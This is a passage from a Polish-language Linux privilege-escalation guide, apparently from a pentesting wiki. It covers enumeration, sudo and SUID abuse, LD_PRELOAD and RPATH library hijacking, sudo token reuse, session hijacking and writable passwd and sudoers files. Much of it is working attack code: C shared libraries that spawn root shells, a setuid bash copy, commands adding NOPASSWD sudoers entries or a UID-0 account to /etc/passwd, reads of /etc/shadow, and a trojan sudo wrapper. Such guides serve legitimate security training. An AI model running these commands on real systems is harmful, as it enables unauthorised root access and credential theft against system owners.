System jest wszechstronny — obsługuje podstawową komunikację międzyprocesową, usprawniając wymianę danych między procesami, przypominając **enhanced UNIX domain sockets**. Ponadto pomaga w rozgłaszaniu zdarzeń lub sygnałów, ułatwiając płynną integrację pomiędzy składnikami systemu. Na przykład sygnał od demona Bluetooth o przychodzącym połączeniu może spowodować wyciszenie odtwarzacza muzyki, poprawiając doświadczenie użytkownika. Dodatkowo D-Bus obsługuje system zdalnych obiektów, ułatwiając żądania usług i wywołania metod między aplikacjami oraz upraszczając procesy, które kiedyś były skomplikowane.

D-Bus działa w modelu **allow/deny**, zarządzając uprawnieniami do wiadomości (wywołania metod, emisje sygnałów itp.) w oparciu o kumulatywny efekt pasujących reguł polityki. Te polityki określają interakcje z bussem, co potencjalnie może umożliwić eskalację uprawnień przez wykorzystanie tych uprawnień.

Przykład takiej polityki w /etc/dbus-1/system.d/wpa_supplicant.conf pokazano poniżej — określa ona uprawnienia użytkownika root do posiadania, wysyłania i odbierania wiadomości od `fi.w1.wpa_supplicant1`.

Polityki bez określonego użytkownika lub grupy mają zastosowanie globalne, natomiast polityki w kontekście "default" dotyczą wszystkich, którzy nie są objęci przez inne specyficzne polityki.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Dowiedz się tutaj, jak enumerate i exploit komunikację D-Bus:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Sieć**

Zawsze warto enumerate sieć i określić pozycję maszyny.

### Ogólna enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Otwarte porty

Zawsze sprawdź usługi sieciowe uruchomione na maszynie, z którymi nie mogłeś się komunikować przed uzyskaniem do niej dostępu:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Sprawdź, czy możesz sniff traffic. Jeśli tak, możesz być w stanie zdobyć credentials.
```
timeout 1 tcpdump
```
## Użytkownicy

### Ogólna enumeracja

Sprawdź **kim** jesteś, jakie **uprawnienia** posiadasz, którzy **użytkownicy** są w systemie, którzy mogą się **zalogować** i którzy mają **przywileje roota**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Duży UID

Niektóre wersje Linuksa były dotknięte błędem, który pozwala użytkownikom z **UID > INT_MAX** na eskalację uprawnień. Więcej informacji: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) i [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Wykorzystaj to** używając: **`systemd-run -t /bin/bash`**

### Grupy

Sprawdź, czy jesteś **członkiem jakiejś grupy**, która mogłaby przyznać ci uprawnienia root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Schowek

Sprawdź, czy w schowku znajduje się coś interesującego (jeśli to możliwe)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Polityka haseł
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Znane hasła

If you **know any password** of the environment **try to login as each user** using the password.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Nadużycia zapisywalnego $PATH

### $PATH

If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.

### SUDO and SUID

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Niektóre **nieoczekiwane polecenia pozwalają odczytywać i/lub zapisywać pliki, a nawet wykonać polecenie.** Na przykład:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Konfiguracja Sudo może pozwolić użytkownikowi na uruchomienie niektórych poleceń z uprawnieniami innego użytkownika bez znajomości hasła.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
W tym przykładzie użytkownik `demo` może uruchamiać `vim` jako `root`, więc łatwo uzyskać shell, dodając ssh key do katalogu `root` lub wywołując `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ta dyrektywa pozwala użytkownikowi **ustawić zmienną środowiskową** podczas wykonywania czegoś:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ten przykład, **oparty na maszynie HTB Admirer**, był **vulnerable** na **PYTHONPATH hijacking**, pozwalający załadować dowolną bibliotekę python podczas uruchamiania skryptu jako root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV zachowane przez sudo env_keep → root shell

Jeśli sudoers zachowuje `BASH_ENV` (np. `Defaults env_keep+="ENV BASH_ENV"`), możesz wykorzystać nieinteraktywny proces startowy Basha, aby uruchomić dowolny kod jako root podczas wywołania dozwolonego polecenia.

- Dlaczego to działa: Dla powłok nieinteraktywnych Bash ocenia `$BASH_ENV` i wczytuje (sources) ten plik przed uruchomieniem docelowego skryptu. Wiele reguł sudo pozwala na uruchomienie skryptu lub wrappera powłoki. Jeśli `BASH_ENV` jest zachowane przez sudo, Twój plik zostanie wczytany z uprawnieniami roota.

- Wymagania:
- Reguła sudo, którą możesz uruchomić (dowolny cel, który wywołuje `/bin/bash` w trybie nieinteraktywnym, lub dowolny skrypt bash).
- `BASH_ENV` obecne w `env_keep` (sprawdź za pomocą `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Usuń `BASH_ENV` (i `ENV`) z `env_keep`, użyj raczej `env_reset`.
- Unikaj wrapperów shellowych dla poleceń dozwolonych przez sudo; używaj minimalnych binariów.
- Rozważ logowanie I/O sudo i alertowanie, gdy używane są zachowane zmienne env.

### Ścieżki obejścia wykonania sudo

**Przejdź** aby przeczytać inne pliki lub użyj **symlinks**. Na przykład w pliku sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Jeśli użyty zostanie **wildcard** (\*), jest to jeszcze łatwiejsze:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Środki zaradcze**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez ścieżki do polecenia

Jeśli **sudo permission** jest nadane pojedynczemu poleceniu **bez określenia ścieżki**: _hacker10 ALL= (root) less_ możesz to wykorzystać, zmieniając zmienną PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Technika ta może być również użyta, jeśli binarka **suid** **wywołuje inną komendę bez podania ścieżki do niej (zawsze sprawdź za pomocą** _**strings**_ **zawartość dziwnej binarki SUID)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binarka SUID ze ścieżką do komendy

Jeśli binarka **suid** **wywołuje inną komendę, podając ścieżkę**, możesz spróbować **wyeksportować funkcję** nazwaną tak jak komenda, którą wywołuje plik suid.

Na przykład, jeśli binarka suid wywołuje _**/usr/sbin/service apache2 start**_, musisz spróbować stworzyć funkcję i ją wyeksportować:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wówczas, gdy wywołasz suid binary, ta funkcja zostanie uruchomiona

### LD_PRELOAD & **LD_LIBRARY_PATH**

Zmienna środowiskowa **LD_PRELOAD** służy do wskazania jednej lub więcej bibliotek współdzielonych (.so files), które loader ma załadować przed wszystkimi innymi, w tym przed standardową biblioteką C (`libc.so`). Ten proces nazywa się preloadingiem biblioteki.

Jednak aby zachować bezpieczeństwo systemu i zapobiec wykorzystaniu tej funkcji, szczególnie w przypadku **suid/sgid** executable, system wymusza pewne warunki:

- Loader ignoruje **LD_PRELOAD** dla executable, gdzie real user ID (_ruid_) nie zgadza się z effective user ID (_euid_).
- Dla executable z suid/sgid, preloadowane są tylko biblioteki znajdujące się w standardowych ścieżkach, które również są suid/sgid.

Escalation uprawnień może wystąpić, jeśli masz możliwość wykonywania poleceń za pomocą `sudo` i wynik `sudo -l` zawiera wpis **env_keep+=LD_PRELOAD**. Taka konfiguracja pozwala, by zmienna środowiskowa **LD_PRELOAD** przetrwała i była rozpoznawana nawet podczas uruchamiania poleceń z `sudo`, co potencjalnie prowadzi do wykonania dowolnego kodu z podwyższonymi uprawnieniami.
```
Defaults        env_keep += LD_PRELOAD
```
Zapisz jako **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Następnie **compile it** przy użyciu:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na koniec, **escalate privileges** uruchamiając
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Podobny privesc może być wykorzystany, jeśli atakujący kontroluje zmienną środowiskową **LD_LIBRARY_PATH**, ponieważ kontroluje ścieżkę, w której będą wyszukiwane biblioteki.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Gdy natrafisz na binary z uprawnieniami **SUID**, które wydają się nietypowe, dobrze jest sprawdzić, czy poprawnie ładuje pliki **.so**. Można to sprawdzić, uruchamiając następujące polecenie:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na przykład, napotkanie błędu takiego jak _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeruje potencjalną możliwość eksploatacji.

Aby to wykorzystać, należy utworzyć plik C, np. _"/path/to/.config/libcalc.c"_, zawierający następujący kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ten kod, po skompilowaniu i uruchomieniu, ma na celu eskalację uprawnień poprzez manipulowanie uprawnieniami plików i uruchomienie shella z podwyższonymi uprawnieniami.

Skompiluj powyższy plik C do pliku shared object (.so) poleceniem:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na koniec uruchomienie dotkniętego SUID binary powinno wywołać exploit, umożliwiając potencjalną kompromitację systemu.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Skoro znaleźliśmy SUID binary ładujący library z folderu, do którego możemy zapisywać, utwórzmy library w tym folderze o odpowiedniej nazwie:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Jeśli otrzymasz błąd taki jak
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to oznacza, że biblioteka, którą wygenerowałeś, musi mieć funkcję nazwaną `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) to wyselekcjonowana lista Unix binaries, które mogą być wykorzystane przez atakującego do obejścia lokalnych ograniczeń bezpieczeństwa. [**GTFOArgs**](https://gtfoargs.github.io/) to to samo, ale dla przypadków, kiedy możesz **wstrzyknąć tylko argumenty** w polecenie.

Projekt zbiera legalne funkcje programów Unix, które można nadużyć, aby wydostać się z ograniczonych shelli, eskalować lub utrzymać podwyższone uprawnienia, przesyłać pliki, uruchamiać bind i reverse shells oraz ułatwiać inne zadania post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Ponowne użycie tokenów sudo

W przypadkach, gdy masz **sudo access** ale nie znasz hasła, możesz eskalować uprawnienia, **czekając na wykonanie polecenia sudo i przechwytując token sesji**.

Wymagania do eskalacji uprawnień:

- Masz już shell jako użytkownik "_sampleuser_"
- "_sampleuser_" użył **`sudo`** do wykonania czegoś w **ostatnich 15 minutach** (domyślnie to czas trwania tokenu sudo, który pozwala nam używać `sudo` bez podawania hasła)
- `cat /proc/sys/kernel/yama/ptrace_scope` zwraca 0
- `gdb` jest dostępny (możesz go przesłać)

(Możesz tymczasowo włączyć `ptrace_scope` za pomocą `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` lub na stałe modyfikując `/etc/sysctl.d/10-ptrace.conf` i ustawiając `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) utworzy sh shell w _/tmp_, którego właścicielem będzie root i będzie mieć setuid
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Trzeci exploit** (`exploit_v3.sh`) **utworzy sudoers file**, który **sprawi, że sudo tokens będą wieczne i pozwoli wszystkim użytkownikom używać sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Jeśli masz **uprawnienia do zapisu** w tym folderze lub na którymkolwiek z utworzonych w nim plików, możesz użyć binarki [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) aby **create a sudo token for a user and PID**.\
Na przykład, jeśli możesz nadpisać plik _/var/run/sudo/ts/sampleuser_ i masz shell jako ten użytkownik z PID 1234, możesz **obtain sudo privileges** bez konieczności znajomości hasła wykonując:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Plik `/etc/sudoers` oraz pliki znajdujące się w `/etc/sudoers.d` konfigurują, kto może używać `sudo` i w jaki sposób. Te pliki **by default can only be read by user root and group root**.\
**Jeżeli** możesz **read** ten plik, możesz uzyskać **interesujące informacje**, a jeśli możesz **write** dowolny plik, będziesz w stanie **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Jeśli możesz zapisywać, możesz nadużyć tego uprawnienia.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Inny sposób nadużycia tych uprawnień:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Istnieją pewne alternatywy dla binarki `sudo`, takie jak `doas` dla OpenBSD. Pamiętaj, aby sprawdzić konfigurację w `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Jeśli wiesz, że **użytkownik zwykle łączy się z maszyną i używa `sudo`** aby eskalować uprawnienia i masz shell w kontekście tego użytkownika, możesz **utworzyć nowy plik wykonywalny sudo**, który wykona twój kod jako root, a następnie polecenie użytkownika. Następnie **zmodyfikuj $PATH** w kontekście użytkownika (na przykład dodając nową ścieżkę w .bash_profile), tak aby gdy użytkownik uruchomi sudo, wykonywany był twój plik sudo.

Zwróć uwagę, że jeśli użytkownik używa innej powłoki (nie bash), będziesz musiał zmodyfikować inne pliki, aby dodać nową ścieżkę. Na przykład[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modyfikuje `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Możesz znaleźć inny przykład w [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Lub uruchamiając coś takiego:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteka współdzielona

### ld.so

Plik `/etc/ld.so.conf` wskazuje **skąd pochodzą wczytywane pliki konfiguracyjne**. Zazwyczaj ten plik zawiera następującą ścieżkę: `include /etc/ld.so.conf.d/*.conf`

Oznacza to, że pliki konfiguracyjne z `/etc/ld.so.conf.d/*.conf` zostaną odczytane. Te pliki konfiguracyjne **wskazują na inne foldery**, w których będą **wyszukiwane** **biblioteki**. Na przykład zawartość `/etc/ld.so.conf.d/libc.conf` to `/usr/local/lib`. **To oznacza, że system będzie szukał bibliotek w katalogu `/usr/local/lib`**.

Jeśli z jakiegoś powodu **użytkownik ma uprawnienia do zapisu** w którejkolwiek z wskazanych ścieżek: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, w dowolnym pliku wewnątrz `/etc/ld.so.conf.d/` lub w dowolnym katalogu wskazanym w pliku konfiguracyjnym z `/etc/ld.so.conf.d/*.conf` może być w stanie eskalować uprawnienia.\
Zobacz **jak wykorzystać tę błędną konfigurację** na następującej stronie:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiując lib do `/var/tmp/flag15/`, program użyje jej w tym miejscu, zgodnie z wartością zmiennej `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Następnie utwórz złośliwą bibliotekę w `/var/tmp` za pomocą `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities zapewniają **podzbiór dostępnych uprawnień roota dla procesu**. To w praktyce rozbija uprawnienia roota **na mniejsze i odrębne jednostki**. Każdej z tych jednostek można następnie niezależnie przyznać procesom. W ten sposób pełny zestaw uprawnień jest zmniejszony, co redukuje ryzyko eskploatacji.\
Przeczytaj następującą stronę, aby **dowiedzieć się więcej o capabilities i jak je nadużywać**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

W katalogu, **bit dla "execute"** oznacza, że dotknięty użytkownik może "**cd**" do folderu.\
Bit **"read"** oznacza, że użytkownik może **wypisać** **pliki**, a bit **"write"** oznacza, że użytkownik może **usunąć** i **utworzyć** nowe **pliki**.

## ACLs

Access Control Lists (ACLs) reprezentują drugą warstwę dyskrecjonalnych uprawnień, zdolną do **nadpisywania tradycyjnych uprawnień ugo/rwx**. Te uprawnienia zwiększają kontrolę nad dostępem do pliku lub katalogu, pozwalając przyznać lub odmówić praw konkretnym użytkownikom, którzy nie są właścicielami ani członkami grupy. Ten poziom **szczegółowości zapewnia bardziej precyzyjne zarządzanie dostępem**. Dalsze szczegóły można znaleźć [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pobierz** pliki z określonymi ACL z systemu:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otwarte shell sessions

W **starych wersjach** możesz **hijack** niektóre **shell** session innego użytkownika (**root**).\
W **najnowszych wersjach** będziesz mógł **połączyć się** tylko do screen sessions **własnego użytkownika**. Jednak możesz znaleźć **interesujące informacje wewnątrz sesji**.

### screen sessions hijacking

**Wyświetl screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Dołącz do sesji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Przejęcie sesji tmux

To był problem ze **starymi wersjami tmux**. Nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root, będąc nieuprzywilejowanym użytkownikiem.

**Wyświetl sesje tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Dołącz do sesji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Zobacz **Valentine box from HTB** jako przykład.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Wszystkie klucze SSL i SSH wygenerowane na systemach opartych na Debianie (Ubuntu, Kubuntu, itd.) między wrześniem 2006 a 13 maja 2008 mogą być podatne na ten błąd.\
Błąd ten występuje podczas tworzenia nowego klucza ssh w tych systemach, ponieważ **możliwe były tylko 32,768 warianty**. Oznacza to, że wszystkie możliwości można obliczyć i **mając publiczny klucz ssh możesz wyszukać odpowiadający mu klucz prywatny**. Możesz znaleźć obliczone możliwości tutaj: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH — interesujące wartości konfiguracyjne

- **PasswordAuthentication:** Określa, czy dozwolone jest uwierzytelnianie hasłem. Domyślnie `no`.
- **PubkeyAuthentication:** Określa, czy dozwolone jest uwierzytelnianie kluczem publicznym. Domyślnie `yes`.
- **PermitEmptyPasswords**: Jeśli uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala na logowanie do kont z pustymi hasłami. Domyślnie `no`.

### PermitRootLogin

Określa, czy root może się logować przy użyciu ssh, domyślnie `no`. Możliwe wartości:

- `yes`: root może się logować używając hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: root może logować się tylko używając klucza prywatnego i jeśli określone są opcje commands
- `no` : brak dostępu

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, które mogą być użyte do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zamienione na katalog domowy. **Możesz wskazać ścieżki bezwzględne** (rozpoczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracja wskaże, że jeśli spróbujesz zalogować się przy użyciu **private** key użytkownika "**testusername**", ssh porówna public key twojego klucza z tymi znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding pozwala ci **używać lokalnych SSH keys zamiast zostawiać klucze** (without passphrases!) na twoim serwerze. Dzięki temu będziesz mógł **połączyć się** przez ssh **z hosta**, a stamtąd **połączyć się z innym** hostem **używając** **klucza** znajdującego się na twoim **hoście początkowym**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
Zwróć uwagę, że jeśli `Host` jest `*` za każdym razem gdy użytkownik przełącza się na inną maszynę, ten host będzie miał dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisać** te **opcje** i zezwolić lub odmówić tej konfiguracji.\
Plik `/etc/sshd_config` może **zezwalać** lub **odmawiać** przekazywania ssh-agent za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie zezwolone).

Jeśli stwierdzisz, że Forward Agent jest skonfigurowany w środowisku, przeczytaj następującą stronę, ponieważ **możesz wykorzystać to do eskalacji uprawnień**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` oraz pliki w katalogu `/etc/profile.d/` to **skrypty, które są wykonywane, gdy użytkownik uruchamia nową powłokę**. Dlatego, jeśli możesz **zapisać lub zmodyfikować którykolwiek z nich, możesz eskalować uprawnienia**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Jeśli zostanie znaleziony jakiś dziwny skrypt profilu, powinieneś sprawdzić go pod kątem **wrażliwych danych**.

### Passwd/Shadow Files

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inną nazwę lub może istnieć ich kopia zapasowa. Dlatego zaleca się **znaleźć wszystkie** i **sprawdzić, czy możesz je odczytać**, aby zobaczyć **czy znajdują się hashes** w plikach:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
W niektórych przypadkach można znaleźć **password hashes** w pliku `/etc/passwd` (lub równoważnym).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Zapisalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednej z poniższych komend.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać użytkownika testowego bez hasła.\
UWAGA: możesz obniżyć aktualne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

